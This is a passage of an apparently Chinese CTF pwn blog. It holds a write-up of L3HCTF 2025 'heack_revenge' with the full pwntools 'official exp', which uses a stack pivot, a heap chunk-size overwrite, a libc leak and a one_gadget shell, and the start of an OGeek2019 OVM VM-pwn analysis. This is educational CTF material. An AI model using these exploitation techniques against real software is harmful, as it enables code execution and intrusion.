class="hljs-string">&quot;Failed to allocate memory for diary!&quot;</span>);<br>            &#125;<br>          &#125;<br>          <span class="hljs-keyword">else</span><br>          &#123;<br>            <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Invalid size!&quot;</span>);<br>          &#125;<br>        &#125;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter index to destroy (0-%d): &quot;</span>, <span class="hljs-number">15LL</span>);<br>        v3 = read_int_4bytes();<br>        <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)v3 &gt;= <span class="hljs-number">0x10</span> )<br>          <span class="hljs-keyword">goto</span> LABEL_23;<br>        <span class="hljs-keyword">if</span> ( !*(_QWORD *)(<span class="hljs-number">8LL</span> * v3 + a1) )<br>          <span class="hljs-keyword">goto</span> LABEL_21;<br>        <span class="hljs-built_in">free</span>(*(<span class="hljs-type">void</span> **)(<span class="hljs-number">8LL</span> * v3 + a1));<br>        *(_QWORD *)(<span class="hljs-number">8LL</span> * v3 + a1) = <span class="hljs-number">0LL</span>;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Diary at index %d has been destroyed.\n&quot;</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)v3);<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">default</span>:<br>LABEL_28:<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Invalid choice!&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>  &#125;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Exiting diary system. Goodbye, hero!&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>本身不存在什么漏洞</p><p>不过这里传进来的参数也就是 game 里的 s（栈上）这里将 s 作为 note_list 其中 index 可以由我们自己来输入</p><h2 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h2><p>我们可以使用栈溢出，将 rbp 改为 s 的地址，也就是 chunk[0] 的地址。然后可以利用 attack&#x2F;hp_training 来使上面的数据变大，如果我们刚好让这个地址为一个 chunk 的 size ，我们就可以将该 chunk 的 size 变为很大，然后 free 掉，再次 malloc 就可以让 fd、bk 进入到一个已分配的 chunk，就可以 view 来泄露，然后由于 rbp 已经被我们控制，我们可以往 rbp 后面写上 one_gadget</p><ul><li>首先构造堆块</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">malloc(<span class="hljs-number">15</span>, <span class="hljs-number">0x600</span>, <span class="hljs-string">b&#x27;safe memory&#x27;</span>)<br>malloc(<span class="hljs-number">1</span>, <span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;To BIG&#x27;</span>)<br>malloc(<span class="hljs-number">0</span>, <span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;rbp&#x27;</span>)<br>malloc(<span class="hljs-number">4</span>, <span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;leak&#x27;</span>)<br>malloc(<span class="hljs-number">2</span>, <span class="hljs-number">0x4d8</span>, <span class="hljs-string">b&#x27;fill&#x27;</span>)<br>malloc(<span class="hljs-number">3</span>, <span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;protect&#x27;</span>)<br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">4</span>)<br></code></pre></td></tr></table></figure><p>其作用都写在后面了</p><p>这样构造完 pop rbp 后 [rbp-0x28] 就是 chunk1 的size了，就可以增加</p><p>此时的堆块</p><p><img src="/2025/07/18/L3Hctf%202025%20heack_revenge%20%E5%A4%8D%E7%8E%B0/1752828467014.png"></p><ul><li>然后让该返回地址为 pop rbp，执行pop rbp 让 rbp 为 chunk0 地址</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">buffer_overflow()<br>sh.send(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br></code></pre></td></tr></table></figure><p>执行完后</p><p><img src="/2025/07/18/L3Hctf%202025%20heack_revenge%20%E5%A4%8D%E7%8E%B0/1752828798690.png" alt="1752828798690"></p><p>可以看到被改成了 chunk0 地址 </p><ul><li>然后把chunk(1,4)分配回来，回到 game 函数来执行 hp&#x2F;attach_training 来增加 chunk1 的 size</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">train_hp()<br>train_hp()<br>train_hp()<br>train_hp()<br>train_hp()<br>train_attack()<br>train_attack()<br>train_attack()<br></code></pre></td></tr></table></figure><p><img src="/2025/07/18/L3Hctf%202025%20heack_revenge%20%E5%A4%8D%E7%8E%B0/1752829234156.png"></p><p>可以看到 chunk1 的 size 被我们增加到了 0x550</p><ul><li>然后 free(1) 后 malloc(0x30) 就可以让 fd bk 进入到 chunk4 里面，就可以 view(4) 来泄露 libcbase</li><li>接着修改 rbp+8 为 ogg</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python">free(<span class="hljs-number">1</span>)<br>malloc(<span class="hljs-number">1</span>, <span class="hljs-number">0x30</span>, <span class="hljs-string">b&#x27;To leak&#x27;</span>)<br>view(<span class="hljs-number">4</span>)<br>sh.recvuntil(<span class="hljs-string">&quot;--- Diary Entry 4 ---\n&quot;</span>)<br>libc_base = u64(sh.recv(<span class="hljs-number">6</span>) + <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">2</span>) - <span class="hljs-number">2112288</span><br>log.success(<span class="hljs-string">&quot;libc_base: &quot;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br>free(<span class="hljs-number">1</span>)<br><br>one_gadget = <span class="hljs-number">0xef52b</span> + libc_base <span class="hljs-comment">#RAX == NULL &amp;&amp; [RBP - 0X78] == NULL</span><br>payload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">4</span> + p64(libc_base + <span class="hljs-number">0x204ff0</span> + <span class="hljs-number">0x78</span>) + p64(one_gadget)<br>malloc(<span class="hljs-number">1</span>, <span class="hljs-number">0x30</span>, payload)<br><br>sla(<span class="hljs-string">&quot;Choose an option: &quot;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">4</span>))<br>sla(<span class="hljs-string">&quot;&gt; &quot;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">6</span>))<br>sh.interactive()<br></code></pre></td></tr></table></figure><p>回到 game 函数里，输入一个非法的执行 sad 后面的 ret 就可以执行 one_gadget 了（其他函数里执行 ret 不会执行one_gadget，只有回到 game 里 rbp 才是直接 chunk0，此时 ret 才可以 one_gadget）</p><h1 id="官方exp"><a href="#官方exp" class="headerlink" title="官方exp"></a>官方exp</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>filename = <span class="hljs-string">&quot;v2&quot;</span><br>libcname = <span class="hljs-string">&quot;./libc.so.6&quot;</span><br>host = <span class="hljs-string">&quot;1.95.8.146&quot;</span><br>port = <span class="hljs-number">19999</span><br>elf = ELF(<span class="hljs-string">&#x27;./v2&#x27;</span>)<br>libc=<span class="hljs-string">&#x27;./libc.so.6&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sla</span>(<span class="hljs-params">a, b</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] Waiting for: <span class="hljs-subst">&#123;<span class="hljs-built_in">repr</span>(a)&#125;</span>&quot;</span>)<br>    sh.sendlineafter(a, b)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">start</span>():<br>    <span class="hljs-keyword">return</span> process(<span class="hljs-string">&#x27;./v2&#x27;</span>)<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fight</span>(<span class="hljs-params">content</span>):<br>    sla(<span class="hljs-string">&quot;&gt; &quot;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br>    sh.sendafter(<span class="hljs-string">&quot;You grip your sword and shout:&quot;</span>, content)<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">train_attack</span>():<br>    sla(<span class="hljs-string">&quot;&gt; &quot;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">train_hp</span>():<br>    sla(<span class="hljs-string">&quot;&gt; &quot;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">3</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">note_system_in</span>():<br>    sla(<span class="hljs-string">&quot;&gt; &quot;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">5</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">malloc</span>(<span class="hljs-params">index, size, content</span>):<br>    sla(<span class="hljs-string">&quot;Choose an option: &quot;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br>    sla(<span class="hljs-string">&quot;Enter index (0-15): &quot;</span>, <span class="hljs-built_in">str</span>(index))<br>    sla(<span class="hljs-string">&quot;Enter diary content size (1-2048): &quot;</span>, <span class="hljs-built_in">str</span>(size))<br>    sh.sendafter(<span class="hljs-string">&quot;Input your content: &quot;</span>, content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>    sla(<span class="hljs-string">&quot;Choose an option: &quot;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))<br>    sla(<span class="hljs-string">&quot;Enter index to destroy (0-15): &quot;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">view</span>(<span class="hljs-params">index</span>):<br>    sla(<span class="hljs-string">&quot;Choose an option: &quot;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">3</span>))<br>    sla(<span class="hljs-string">&quot;Enter index to view (0-15): &quot;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">note_system_out</span>():<br>    sla(<span class="hljs-string">&quot;Choose an option: &quot;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">4</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">buffer_overflow</span>():<br>    payload = <span class="hljs-string">b&#x27;A&#x27;</span> * (<span class="hljs-number">259</span> - <span class="hljs-number">0xe0</span>) + <span class="hljs-string">b&#x27;\x37&#x27;</span> + <span class="hljs-string">b&#x27;\x6A&#x27;</span><br>    fight(payload)<br><br>sh = start()<br>note_system_in()<br>malloc(<span class="hljs-number">15</span>, <span class="hljs-number">0x600</span>, <span class="hljs-string">b&#x27;safe memory&#x27;</span>)<br>malloc(<span class="hljs-number">1</span>, <span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;To BIG&#x27;</span>)<br>malloc(<span class="hljs-number">0</span>, <span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;rbp&#x27;</span>)<br>malloc(<span class="hljs-number">4</span>, <span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;leak&#x27;</span>)<br>malloc(<span class="hljs-number">2</span>, <span class="hljs-number">0x4d8</span>, <span class="hljs-string">b&#x27;fill&#x27;</span>)<br>malloc(<span class="hljs-number">3</span>, <span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;protect&#x27;</span>)<br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">4</span>)<br><br>note_system_out()<br>buffer_overflow()<br>sh.send(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br><br>note_system_in()<br>malloc(<span class="hljs-number">4</span>, <span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;leak&#x27;</span>)<br>malloc(<span class="hljs-number">1</span>, <span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;To BIG&#x27;</span>)<br>note_system_out()<br>train_hp()<br>train_hp()<br>train_hp()<br>train_hp()<br>train_hp()<br>train_attack()<br>train_attack()<br>train_attack()<br>note_system_in()<br>free(<span class="hljs-number">1</span>)<br>malloc(<span class="hljs-number">1</span>, <span class="hljs-number">0x30</span>, <span class="hljs-string">b&#x27;To leak&#x27;</span>)<br>view(<span class="hljs-number">4</span>)<br>sh.recvuntil(<span class="hljs-string">&quot;--- Diary Entry 4 ---\n&quot;</span>)<br>libc_base = u64(sh.recv(<span class="hljs-number">6</span>) + <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">2</span>) - <span class="hljs-number">2112288</span><br>log.success(<span class="hljs-string">&quot;libc_base: &quot;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br>free(<span class="hljs-number">1</span>)<br><br>one_gadget = <span class="hljs-number">0xef52b</span> + libc_base <span class="hljs-comment">#RAX == NULL &amp;&amp; [RBP - 0X78] == NULL</span><br>payload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">4</span> + p64(libc_base + <span class="hljs-number">0x204ff0</span> + <span class="hljs-number">0x78</span>) + p64(one_gadget)<br>malloc(<span class="hljs-number">1</span>, <span class="hljs-number">0x30</span>, payload)<br><br>sla(<span class="hljs-string">&quot;Choose an option: &quot;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">4</span>))<br>sla(<span class="hljs-string">&quot;&gt; &quot;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">6</span>))<br>sh.interactive()<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>VM pwn</title>
    <link href="/2025/07/09/VM%20pwn/"/>
    <url>/2025/07/09/VM%20pwn/</url>
    
    <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>VM pwn题目通常是模拟一套虚拟机，对用户输入的opcode进行解析，模拟程序的执行</p><p>一般会有如下操作</p><ul><li>初始化模拟的寄存器空间(reg)</li><li>初始化模拟的栈空间(stack)</li><li>初始化模拟的data段(data)</li><li>初始化模拟的opcode存储空间(text)</li></ul><p>当用户输入指令后，该程序会根据自己设计的逻辑进行执行，这些空间全都是自己分配的而不是系统给的</p><p>一般的漏洞都是越界读取导致的，导致地址泄露，越界写入等</p><h1 id="OGeek2019-Final-OVM"><a href="#OGeek2019-Final-OVM" class="headerlink" title="[OGeek2019 Final]OVM"></a>[OGeek2019 Final]OVM</h1><h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs scss">yyyffff<span class="hljs-keyword">@yyyffff-virtual-machine</span>:~/桌面$ checksec ovm<br>[*] <span class="hljs-string">&#x27;/home/yyyffff/桌面/ovm&#x27;</span><br>    <span class="hljs-attribute">Arch</span>:       amd64-<span class="hljs-number">64</span>-little<br>    <span class="hljs-attribute">RELRO</span>:      Full RELRO<br>    <span class="hljs-attribute">Stack</span>:      No canary found<br>    <span class="hljs-attribute">NX</span>:         NX enabled<br>    <span class="hljs-attribute">PIE</span>:        PIE enabled<br>    <span class="hljs-attribute">Stripped</span>:   No<br></code></pre></td></tr></table></figure><h2 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> __int16 v4; <span class="hljs-comment">// [rsp+2h] [rbp-Eh] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int16 v5; <span class="hljs-comment">// [rsp+4h] [rbp-Ch] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int16 v6; <span class="hljs-comment">// [rsp+6h] [rbp-Ah] BYREF</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v7; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+Ch] [rbp-4h]</span><br><br>  comment = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x8Cu</span>LL);<br>  setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0LL</span>);<br>  setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0LL</span>);<br>  setbuf(<span class="hljs-built_in">stderr</span>, <span class="hljs-number">0LL</span>);<br>  signal(<span class="hljs-number">2</span>, signal_handler);<br>  write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;WELCOME TO OVM PWN\n&quot;</span>, <span class="hljs-number">0x16u</span>LL);<br>  write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;PC: &quot;</span>, <span class="hljs-number">4uLL</span>);<br>  _isoc99_scanf(<span class="hljs-string">&quot;%hd&quot;</span>, &amp;v5);<br>  getchar();<br>  write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;SP: &quot;</span>, <span class="hljs-number">4uLL</span>);<br>  _isoc99_scanf(<span class="hljs-string">&quot;%hd&quot;</span>, &amp;v6);<br>  getchar();<br>  reg[<span class="hljs-number">13</span>] = v6;<br>  reg[<span class="hljs-number">15</span>] = v5;<br>  write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;CODE SIZE: &quot;</span>, <span class="hljs-number">0xBu</span>LL);<br>  _isoc99_scanf(<span class="hljs-string">&quot;%hd&quot;</span>, &amp;v4);<br>  getchar();<br>  <span class="hljs-keyword">if</span> ( v6 + (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)v4 &gt; <span class="hljs-number">0x10000</span> || !v4 )<br>  &#123;<br>    write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;EXCEPTION\n&quot;</span>, <span class="hljs-number">0xAu</span>LL);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">155</span>);<br>  &#125;<br>  write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;CODE: &quot;</span>, <span class="hljs-number">6uLL</span>);<br>  running = <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; v4 &gt; i; ++i )<br>  &#123;<br>    _isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;memory[v5 + i]);<br>    <span class="hljs-keyword">if</span> ( (memory[i + v5] &amp; <span class="hljs-number">0xFF000000</span>) == <span class="hljs-number">0xFF000000</span> )<br>      memory[i + v5] = <span class="hljs-number">0xE0000000</span>;<br>    getchar();<br>  &#125;<br>  <span class="hljs-keyword">while</span> ( running )<br>  &#123;<br>    v7 = fetch();                               <span class="hljs-comment">// 取出指令</span><br>    execute(v7);                                <span class="hljs-comment">// 执行指令</span><br>  &#125;<br>  write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;HOW DO YOU FEEL AT OVM?\n&quot;</span>, <span class="hljs-number">0x1Bu</span>LL);<br>  read(<span class="hljs-number">0</span>, comment, <span class="hljs-number">0x8Cu</span>LL);<br>  sendcomment((<span class="hljs-type">void</span> *)comment);<br>  write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;Bye\n&quot;</span>, <span class="hljs-number">4uLL</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>分析一下程序运行逻辑</p><ul><li>首先输入PC，模拟指令寄存器运行</li><li>接着输入SP，模拟栈顶寄存器运行</li><li>然后输入CODE SIZE，也就是有多少条指令</li><li>接着循环输入CODE：到memory里面</li><li>接着循环fetch（取出指令）和execute（分析，执行）</li></ul><p>fetch</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 <span class="hljs-title function_">fetch</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> v0; <span class="hljs-comment">// eax</span><br><br>  v0 = reg[<span class="hljs-number">15</span>];<br>  reg[<span class="hljs-number">15</span>] = v0 + <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">return</span> (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)memory[v0];<br>&#125;<br></code></pre></td></tr></table></figure><p>excute</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">ssize_t</span> __fastcall <span class="hljs-title function_">execute</span><span class="hljs-params">(<span class="hljs-type">int</span> a1)</span><br>&#123;<br>  <span class="hljs-type">ssize_t</span> result; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">unsigned</span> __int8 v2; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br>  <span class="hljs-type">unsigned</span> __int8 v3; <span class="hljs-comment">// [rsp+19h] [rbp-7h]</span><br>  <span class="hljs-type">unsigned</span> __int8 v4; <span class="hljs-comment">// [rsp+1Ah] [rbp-6h]</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+1Ch] [rbp-4h]</span><br><br>  v4 = (a1 &amp; <span class="hljs-number">0xF0000u</span>) &gt;&gt; <span class="hljs-number">16</span>;<br>  v3 = (<span class="hljs-type">unsigned</span> __int16)(a1 &amp; <span class="hljs-number">0xF00</span>) &gt;&gt; <span class="hljs-number">8</span>;<br>  v2 = a1 &amp; <span class="hljs-number">0xF</span>;<span class="hljs-comment">//指令的解析</span><br>  result = HIBYTE(a1);                          <span class="hljs-comment">// 操作码，高字节</span><br>  <span class="hljs-keyword">if</span> ( HIBYTE(a1) == <span class="hljs-number">0x70</span> )<br>  &#123;<br>    result = (<span class="hljs-type">ssize_t</span>)reg;<br>    reg[v4] = reg[v2] + reg[v3];<br>    <span class="hljs-keyword">return</span> result;<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( HIBYTE(a1) &gt; <span class="hljs-number">0x70u</span> )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( HIBYTE(a1) == <span class="hljs-number">0xB0</span> )<br>    &#123;<br>      result = (<span class="hljs-type">ssize_t</span>)reg;<br>      reg[v4] = reg[v2] ^ reg[v3];<br>      <span class="hljs-keyword">return</span> result;<br>    &#125;<br>    <span class="hljs-keyword">if</span> ( HIBYTE(a1) &gt; <span class="hljs-number">0xB0u</span> )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( HIBYTE(a1) == <span class="hljs-number">0xD0</span> )<br>      &#123;<br>        result = (<span class="hljs-type">ssize_t</span>)reg;<br>        reg[v4] = (<span class="hljs-type">int</span>)reg[v3] &gt;&gt; reg[v2];<br>        <span class="hljs-keyword">return</span> result;<br>      &#125;<br>      <span class="hljs-keyword">if</span> ( 